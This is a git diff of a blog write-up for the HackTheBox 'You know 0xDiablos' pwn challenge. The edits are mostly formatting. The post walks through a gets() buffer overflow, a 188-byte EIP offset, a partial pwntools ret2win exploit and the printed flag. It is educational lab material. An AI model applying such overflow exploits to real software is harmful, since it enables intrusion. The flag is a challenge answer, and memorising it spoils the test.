@@ -1,14 +1,14 @@
 ---
-title: '[HTB] You know 0xDiablos Writeup'
+title: "[HTB] You know 0xDiablos Writeup"
 cover: >-
-  https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/help-you-at-solving-hackthebox-htb-challenges-machines.png
+    https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/help-you-at-solving-hackthebox-htb-challenges-machines.png
 categories:
-  - - HackTheBox
-  - - CTF
+    - - HackTheBox
+    - - CTF
 tags:
-  - HTB
-  - Pwn
-  - HackTheBox
+    - HTB
+    - Pwn
+    - HackTheBox
 abbrlink: ca279614
 date: 2024-07-31 15:52:37
 ---
@@ -19,15 +19,15 @@ As usual, let's see the challenge desciption first.
 
 > I missed my flag
 
-It's a really simple description lol. Let's directly dive into the analyzation part.  
+It's a really simple description lol. Let's directly dive into the analyzation part.
 
-# 0x01 Analyze
+# 0x01 Reconnaissance
 
 ## Checksec
 
 ```bash
 ┌──(kali㉿kali)-[~/CTF/HTB/You know 0xDiablos]
-└─$ pwn checksec vuln                        
+└─$ pwn checksec vuln
 [*] '/home/kali/CTF/HTB/You know 0xDiablos/vuln'
     Arch:     i386-32-little
     RELRO:    Partial RELRO
@@ -58,7 +58,7 @@ int __cdecl main(int argc, const char **argv, const char **envp)
 }
 ```
 
-The `vuln()` seems interesting, let's check what it does. 
+The `vuln()` seems interesting, let's check what it does.
 
 ```c
 int vuln()
@@ -72,7 +72,7 @@ int vuln()
 
 It allocates a memory space of 180 bytes and use `gets()` to ask for the input. As everybody knows, the `gets()` function is regarded as a super dangerous funtion, and the vulnerability of this challenge will happen here.
 
-Besides this, you can notice that there's still a cool function called `flag()`.  Let's see the code below.
+Besides this, you can notice that there's still a cool function called `flag()`. Let's see the code below.
 
 ```c
 char *__cdecl flag(int a1, int a2)
@@ -104,10 +104,10 @@ At this point, we can probably know that this challenge is a **ret2win** problem
 pwndbg> cyclic 200
 aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
 pwndbg> r
-Starting program: /home/kali/CTF/HTB/You know 0xDiablos/vuln 
+Starting program: /home/kali/CTF/HTB/You know 0xDiablos/vuln
 [Thread debugging using libthread_db enabled]
 Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
-You know who are 0xDiablos: 
+You know who are 0xDiablos:
 aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
 aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
 
@@ -144,7 +144,7 @@ Invalid address 0x62616177
 pwndbg>
 ```
 
-- `EIP`
+-   `EIP`
 
 ```bash
 pwndbg> cyclic -l waab
@@ -152,7 +152,7 @@ Finding cyclic pattern of 4 bytes: b'waab' (hex: 0x77616162)
 Found at offset 188
 ```
 
-- `ESP`
+-   `ESP`
 
 ```bash
 pwndbg> cyclic -l xaab
@@ -164,9 +164,9 @@ Found at offset 192
 
 Since we know that the offset to control the `EIP` is 188, we can build our exploit! Here's the step.
 
-1. Overflow and overwrite the `EIP` to the address of `flag()`. 
+1. Overflow and overwrite the `EIP` to the address of `flag()`.
 2. Concat the ROP Chain with the value of a1 and a1, which is 0xDEADBEEF and 0xC0DED00D.
-3. Pwned. 
+3. Pwned.
 
 ```txt
 -0000000000000010                 db ? ; undefined
@@ -187,7 +187,7 @@ Since we know that the offset to control the `EIP` is 188, we can build our expl
 +0000000000000010 ; end of stack variables
 ```
 
-By this stack frame view of `flag()` from IDA, we can see that when we overflow the `var_4` and `s`, we can get to the `r`, which is the return address. Furthermore, once we overflow the return address, it comes to `arg_0` & `arg_4`, which are a1 & a2. So I write the exploit like this.  
+By this stack frame view of `flag()` from IDA, we can see that when we overflow the `var_4` and `s`, we can get to the `r`, which is the return address. Furthermore, once we overflow the return address, it comes to `arg_0` & `arg_4`, which are a1 & a2. So I write the exploit like this.
 
 ```python
 from pwn import *
@@ -233,8 +233,6 @@ r.sendline(payload)
 r.interactive()
 ```
 
-
-
 # 0x03 Pwned
 
 ```txt
@@ -242,6 +240,3 @@ HTB{0ur_Buff3r_1s_not_healthy}
 ```
 
 Although I found the flag, I searched for a lot of writeups during the challenge. And I don't think I totally understand the whole concept of this challenge, probably just about 80% only. I'll keep leaning new stuff and reviewing things I learned, hope one day I can entirely understand this challenge. And that day, I will be back here and try to fix everything wrong in this article.
-
-
-
